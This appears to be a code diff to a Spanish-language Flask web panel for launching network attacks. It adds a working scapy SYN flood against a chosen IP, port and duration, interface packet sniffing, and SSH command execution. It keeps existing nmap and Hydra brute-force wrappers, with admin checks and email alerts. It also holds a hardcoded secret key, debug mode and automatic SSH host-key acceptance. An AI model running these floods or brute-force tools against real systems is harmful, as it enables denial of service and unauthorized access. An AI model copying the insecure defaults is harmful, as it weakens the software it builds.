@@ -1,12 +1,12 @@
-# app.py
 from flask import Flask, render_template, request, redirect, url_for
 from flask_login import LoginManager, UserMixin, login_user, login_required, logout_user, current_user
 import subprocess, os, sqlite3, threading, random, time, smtplib
-from scapy.all import sniff, IP, TCP, UDP, send, Ether, ARP
+from scapy.all import sniff, IP, TCP, UDP, send
 from werkzeug.security import generate_password_hash, check_password_hash
 from email.mime.text import MIMEText
 from email.mime.multipart import MIMEMultipart
 from datetime import datetime
+import paramiko
 
 app = Flask(__name__)
 app.secret_key = 'clave_secreta_aleatoria_segura'
@@ -43,9 +43,28 @@ def send_alert(tipo, ip):
     msg = MIMEMultipart()
     msg['From'] = EMAIL_FROM
     msg['To'] = EMAIL_TO
-    msg['Subject'] = f"[ALERTA] Ataque iniciado"
+    msg['Subject'] = f"[ALERTA] Nuevo ataque iniciado"
     body = f"""
     <p>El usuario <strong>{current_user.username}</strong> ha iniciado un ataque <b>{tipo}</b> contra la IP <b>{ip}</b>.</p>
+    <p>Fecha y hora: {datetime.now()}</p>
+    """
+    msg.attach(MIMEText(body, 'html'))
+    try:
+        smtp = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
+        smtp.starttls()
+        smtp.login(EMAIL_FROM, EMAIL_PASS)
+        smtp.send_message(msg)
+        smtp.quit()
+    except Exception as e:
+        print(f"[ERROR EMAIL] {e}")
+
+def send_alert_denegado(tipo):
+    msg = MIMEMultipart()
+    msg['From'] = EMAIL_FROM
+    msg['To'] = EMAIL_TO
+    msg['Subject'] = f"[ALERTA] Intento denegado de ataque"
+    body = f"""
+    <p>El usuario <strong>{current_user.username}</strong> ha intentado usar un ataque <b>{tipo}</b> sin permisos.</p>
     <p>Fecha y hora: {datetime.now()}</p>
     """
     msg.attach(MIMEText(body, 'html'))
@@ -150,6 +169,50 @@ def guardar_resultado_hydra(result, ip):
     except sqlite3.Error as e:
         print(f"[SQLITE HYDRA] {e}")
 
+# ---- SYN FLOOD ----
+def syn_flood_attack(ip, puerto, duracion):
+    from scapy.layers.inet import IP, TCP
+    end = time.time() + int(duracion)
+    while time.time() < end:
+        pkt = IP(dst=ip)/TCP(sport=random.randint(1024,65535), dport=int(puerto), flags='S')
+        send(pkt, verbose=False)
+
+def start_syn_flood(ip, puerto, duracion):
+    thread = threading.Thread(target=syn_flood_attack, args=(ip, puerto, duracion))
+    thread.daemon = True
+    thread.start()
+    send_alert("SYN Flood", ip)
+
+# ---- SNIFFING ----
+sniff_data = []
+
+def packet_handler(pkt):
+    if IP in pkt:
+        proto = "TCP" if TCP in pkt else "UDP" if UDP in pkt else "Otro"
+        sniff_data.append({
+            "src": pkt[IP].src,
+            "dst": pkt[IP].dst,
+            "proto": proto
+        })
+
+def start_sniffing(interface, duracion):
+    sniff(iface=interface, prn=packet_handler, timeout=int(duracion), store=False)
+    send_alert("Sniffing", interface)
+
+# ---- SSH Escaneo Interfaz ----
+def escanear_interfaz_ssh(ip, ssh_user, ssh_pass):
+    try:
+        ssh = paramiko.SSHClient()
+        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+        ssh.connect(ip, username=ssh_user, password=ssh_pass, timeout=5)
+        stdin, stdout, stderr = ssh.exec_command("ip a")
+        salida = stdout.read().decode()
+        ssh.close()
+        send_alert("Escaneo de interfaz de red (SSH)", ip)
+        return salida
+    except Exception as e:
+        return f"Error SSH: {e}"
+
 # ---- FLASK ROUTES ----
 @app.route('/login', methods=['GET', 'POST'])
 def login():
@@ -174,40 +237,66 @@ def logout():
 def index():
     result = None
     hydra_result = None
+    ssh_result = None
     message = None
+
     if request.method == "POST":
         ip = request.form["ip"]
         tipo = request.form["tipo_ataque"]
+
         if tipo == "nmap":
             result = run_nmap(ip)
-        elif tipo == "hydra" and current_user.role == "admin":
-            dicc = request.form["diccionario"]
-            usuario = request.form["usuario"]
-            proto = request.form["protocolo"]
-            hydra_result = run_hydra(ip, dicc, usuario, proto)
 
-    return render_template(
-        "index.html",
-        username=current_user.username,
-        role=current_user.role,
-        result=result,
-        hydra_result=hydra_result,
-        diccionarios=obtener_diccionarios()
-    )
+        elif tipo == "hydra":
+            if current_user.role != "admin":
+                send_alert_denegado("Hydra")
+                message = "❌ No tienes permisos para ejecutar Hydra."
+            else:
+                dicc = request.form["diccionario"]
+                usuario = request.form["usuario"]
+                proto = request.form["protocolo"]
+                hydra_result = run_hydra(ip, dicc, usuario, proto)
 
-@app.route("/dashboards")
+        elif tipo == "syn_flood":
+            if current_user.role != "admin":
+                send_alert_denegado("SYN Flood")
+                message = "❌ No tienes permisos para ejecutar SYN Flood."
+            else:
+                puerto = request.form["puerto"]
+                duracion = request.form["duracion"]
+                threading.Thread(target=start_syn_flood, args=(ip, puerto, duracion)).start()
+                message = f"✅ Ataque SYN Flood iniciado contra {ip} en puerto {puerto} por {duracion} segundos."
+
+        elif tipo == "sniff":
+            if current_user.role != "admin":
+                send_alert_denegado("Sniffing")
+                message = "❌ No tienes permisos para ejecutar Sniffing."
+            else:
+                interfaz = request.form["interfaz"]
+                duracion = request.form["duracion"]
+                threading.Thread(target=start_sniffing, args=(interfaz, duracion)).start()
+                message = f"✅ Sniffing iniciado en interfaz {interfaz} durante {duracion} segundos."
+
+        elif tipo == "ssh_ip":
+            ssh_user = request.form["ssh_user"]
+            ssh_pass = request.form["ssh_pass"]
+            ssh_result = escanear_interfaz_ssh(ip, ssh_user, ssh_pass)
+
+    diccionarios = obtener_diccionarios()
+    return render_template("index.html",
+                           result=result,
+                           hydra_result=hydra_result,
+                           ssh_result=ssh_result,
+                           diccionarios=diccionarios,
+                           message=message,
+                           role=current_user.role)
+
+# NUEVA RUTA PARA DASHBOARDS
+@app.route('/dashboards')
 @login_required
 def dashboards():
-    return render_template("grafana.html")
-
-@app.route("/grafana_proxy/<dashboard>")
-@login_required
-def grafana_proxy(dashboard):
-    if dashboard == "hydra":
-        return redirect("http://localhost:3000/d/hydra/hydra-dashboard?orgId=1")
-    elif dashboard == "nmap":
-        return redirect("http://localhost:3000/d/nmap/nmap-dashboard?orgId=1")
-    return "Dashboard no encontrado", 404
+    # Aquí puedes cambiar la plantilla o poner contenido que necesites
+    return render_template('grafana.html')
 
 if __name__ == "__main__":
     app.run(debug=True)
